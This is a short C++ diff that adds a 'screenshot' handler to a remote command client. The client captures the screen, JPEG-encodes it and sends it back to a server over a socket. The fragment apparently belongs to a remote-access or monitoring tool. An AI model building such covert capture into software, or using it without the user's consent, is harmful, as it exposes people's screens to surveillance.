@@ -38,9 +38,22 @@ namespace silence
     {
         auto commandObject = data->get_map();
         std::string command = commandObject["command"]->get_string();
+        std::cout << command << std::endl;
 
         if (command == "screenshot")
         {
+            impl::Screenshot screen;
+            cv::Mat image{screen.take()};
+
+            //convert to bytes
+            std::vector<uchar> imageDataVector;
+            cv::imencode(".jpg", image, imageDataVector);
+
+            std::string imageBuffer(imageDataVector.begin(), imageDataVector.end());
+
+            mIO->socket()
+                ->emit("command response",
+                       std::make_shared<std::string>(imageBuffer));
         }
     }
 }
